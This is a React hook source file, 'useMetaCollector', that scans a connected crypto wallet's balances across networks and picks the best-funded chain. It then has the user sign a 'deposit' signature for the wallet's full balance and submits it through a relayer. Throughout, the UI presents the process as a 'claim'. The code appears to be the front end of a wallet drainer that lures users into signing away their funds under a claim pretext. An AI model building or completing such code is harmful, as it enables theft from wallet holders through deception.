import { useState, useEffect, useCallback } from 'react'
import { useAccount, useWalletClient, useSwitchChain, useChainId, useDisconnect } from 'wagmi'
import { useAppKit } from '@reown/appkit/react'
import { ethers } from 'ethers'
import { 
  METACOLLECTOR_CONTRACTS, 
  NETWORK_PRIORITY
} from '../config/contracts'
import { 
  checkBalancesAcrossNetworks, 
  getEligibleNetworks, 
  getBestNetwork 
} from '../utils/balanceChecker'
import { createDepositSignature } from '../utils/signature'
import { submitDepositViaRelayer, checkRelayerHealth, fetchUserNonce } from '../utils/relayer'

export function useMetaCollector() { 
  const { address, isConnected } = useAccount()
  const { data: walletClient } = useWalletClient()
  const chainId = useChainId()
  const { switchChain } = useSwitchChain()
  const { disconnect } = useDisconnect()
  const { open } = useAppKit()

  const [loading, setLoading] = useState(false)
  const [claimLoading, setClaimLoading] = useState(false)
  const [fetchingNonce, setFetchingNonce] = useState(false)
  const [balanceResults, setBalanceResults] = useState(null)
  const [eligibleNetworks, setEligibleNetworks] = useState([])
  const [bestNetwork, setBestNetwork] = useState(null)
  const [relayerHealth, setRelayerHealth] = useState(null)
  const [transactionStatus, setTransactionStatus] = useState(null)
  const [currentNonce, setCurrentNonce] = useState(null)
  const [nonceError, setNonceError] = useState(null)

  // Fetch relayer health on mount
  useEffect(() => {
    checkHealth()
  }, [])

  // Check balances when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      checkBalances()
    } else {
      resetState()
    }
  }, [isConnected, address])

  // Fetch nonce when best network changes
  useEffect(() => {
    if (bestNetwork && address) {
      fetchNonceForNetwork()
    } else {
      setCurrentNonce(null)
      setNonceError(null)
    }
  }, [bestNetwork, address])

  const resetState = () => {
    setBalanceResults(null)
    setEligibleNetworks([])
    setBestNetwork(null)
    setCurrentNonce(null)
    setNonceError(null)
    setTransactionStatus(null)
  }

  const checkHealth = async () => {
    try {
      const health = await checkRelayerHealth()
      setRelayerHealth(health)
      console.log('✅ Relayer health check passed:', health)
    } catch (error) {
      console.error('❌ Failed to check relayer health:', error)
      setTransactionStatus({
        type: 'error',
        message: 'Relayer is not responding. Please try again later.'
      })
    }
  }

  // NEW: Fetch current nonce from backend
  const fetchNonceForNetwork = async () => {
    if (!bestNetwork || !address) return

    setFetchingNonce(true)
    setNonceError(null)

    try {
      console.log(`📡 Fetching nonce for ${address} on ${bestNetwork.networkName}...`)
      
      const response = await fetchUserNonce(address)
      
      if (!response.success) {
        throw new Error(response.error || 'Failed to fetch nonce')
      }

      // Get nonce for the current network
      const networkNonce = response.nonces[bestNetwork.network]?.nonce
      
      if (networkNonce === undefined || networkNonce === null) {
        throw new Error(`No nonce data for network: ${bestNetwork.networkName}`)
      }

      console.log(`✅ Current nonce for ${bestNetwork.networkName}: ${networkNonce}`)
      setCurrentNonce(networkNonce)
      
    } catch (error) {
      console.error('❌ Failed to fetch nonce:', error)
      setNonceError(error.message)
      setTransactionStatus({
        type: 'error',
        message: `Failed to fetch nonce: ${error.message}`
      })
    } finally {
      setFetchingNonce(false)
    }
  }

  // NEW: Manual refresh nonce
  const refreshNonce = async () => {
    await fetchNonceForNetwork()
  }

  const checkBalances = async () => {
    if (!address) {
      setTransactionStatus({
        type: 'error',
        message: 'Please connect your wallet first'
      })
      return
    }

    setLoading(true)
    setTransactionStatus({
      type: 'pending',
      message: 'Checking wallet balances across networks...'
    })

    try {
      const results = await checkBalancesAcrossNetworks(address)
      setBalanceResults(results)
      
      const eligible = getEligibleNetworks(results)
      setEligibleNetworks(eligible)
      
      const best = getBestNetwork(eligible, NETWORK_PRIORITY)
      setBestNetwork(best)

      if (eligible.length === 0) {
        setTransactionStatus({
          type: 'info',
          message: 'No network has sufficient balance (need ~$1 worth of gas)'
        })
      } else {
        setTransactionStatus({
          type: 'success',
          message: `✅ Funds available on ${eligible.length} network(s)! Best: ${best.networkName}`
        })
      }
    } catch (error) {
      console.error('Balance check failed:', error)
      setTransactionStatus({
        type: 'error',
        message: `Failed to check balances: ${error.message}`
      })
    } finally {
      setLoading(false)
    }
  }

  const getEthersSigner = useCallback(async () => {
    if (!walletClient) {
      throw new Error('No wallet client available')
    }

    const { transport } = walletClient
    const provider = new ethers.BrowserProvider(transport, 'any')
    return await provider.getSigner()
  }, [walletClient])

  const claimDeposit = async () => {
    if (!isConnected || !address) {
      setTransactionStatus({
        type: 'error',
        message: 'Please connect your wallet first'
      })
      return
    }

    if (!bestNetwork) {
      setTransactionStatus({
        type: 'error',
        message: 'No eligible network found with sufficient balance'
      })
      return
    }

    // Check if nonce is available
    if (currentNonce === null) {
      setTransactionStatus({
        type: 'error',
        message: 'Nonce not available. Please wait or refresh.'
      })
      return
    }

    if (fetchingNonce) {
      setTransactionStatus({
        type: 'pending',
        message: 'Still fetching current nonce, please wait...'
      })
      return
    }

    setClaimLoading(true)
    setTransactionStatus({
      type: 'pending',
      message: 'Preparing claim transaction...'
    })

    try {
      // Switch network if needed
      if (chainId !== bestNetwork.chainId) {
        setTransactionStatus({
          type: 'pending',
          message: `Switching to ${bestNetwork.networkName}...`
        })
        
        await switchChain({ chainId: bestNetwork.chainId })
        await new Promise(resolve => setTimeout(resolve, 2000))
      }

      const signer = await getEthersSigner()
      
      const signerAddress = await signer.getAddress()
      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
        throw new Error('Signer address mismatch')
      }

      setTransactionStatus({
        type: 'pending',
        message: 'Creating signature with current nonce...'
      })

      // Use the actual balance from the network, not a hardcoded amount
      const claimAmount = bestNetwork.balanceFormatted || '0.001'

      console.log('========== CLAIM DEBUG ==========')
      console.log('Network:', bestNetwork.networkName)
      console.log('Chain ID:', bestNetwork.chainId)
      console.log('Contract:', bestNetwork.contractAddress)
      console.log('User:', address)
      console.log('Amount:', claimAmount)
      console.log('Nonce from contract:', currentNonce)
      console.log('================================')

      const signaturePayload = await createDepositSignature({
        signer,
        contractAddress: bestNetwork.contractAddress,
        chainId: bestNetwork.chainId,
        user: address,
        amount: claimAmount,
        nonce: parseInt(currentNonce) // Use the fetched nonce
      })

      console.log('========== PAYLOAD ==========')
      console.log('Domain:', JSON.stringify(signaturePayload.domain, null, 2))
      console.log('Value:', {
        user: signaturePayload.value.user,
        amount: signaturePayload.value.amount.toString(),
        nonce: signaturePayload.value.nonce
      })
      console.log('Signature:', signaturePayload.signature.substring(0, 50) + '...')
      console.log('==============================')

      setTransactionStatus({
        type: 'pending',
        message: 'Submitting to relayer...'
      })

      const result = await submitDepositViaRelayer({
        contractAddress: bestNetwork.contractAddress,
        signaturePayload
      })

      setTransactionStatus({
        type: 'success',
        message: `✅ Claim successful on ${result.network}! Transaction: ${result.hash.substring(0, 10)}...`,
        hash: result.hash
      })

      // Refresh nonce after successful claim
      setTimeout(() => fetchNonceForNetwork(), 3000)
      setTimeout(() => checkBalances(), 5000)

    } catch (error) {
      console.error('❌ Claim failed:', error)
      
      // Check for specific nonce error
      if (error.message && error.message.includes('Invalid nonce')) {
        // Try to extract expected nonce
        const match = error.message.match(/expected (\d+)/)
        if (match && match[1]) {
          setTransactionStatus({
            type: 'error',
            message: `Nonce mismatch. Contract expected ${match[1]}, you used ${currentNonce}. Refreshing...`
          })
          // Refresh nonce automatically
          setTimeout(() => fetchNonceForNetwork(), 2000)
        } else {
          setTransactionStatus({
            type: 'error',
            message: `Nonce error: ${error.message}`
          })
        }
      } else {
        setTransactionStatus({
          type: 'error',
          message: `Claim failed: ${error.message}`
        })
      }
    } finally {
      setClaimLoading(false)
    }
  }

  const handleConnect = () => {
    open()
  }

  const handleDisconnect = async () => {
    try {
      await disconnect()
      resetState()
    } catch (error) {
      console.error('Disconnect error:', error)
    }
  }

  return {
    address,
    isConnected,
    loading,
    claimLoading,
    fetchingNonce,
    balanceResults,
    eligibleNetworks,
    bestNetwork,
    relayerHealth,
    transactionStatus,
    currentNonce,
    nonceError,
    checkBalances,
    claimDeposit,
    handleConnect,
    handleDisconnect,
    refreshNonce
  }
}

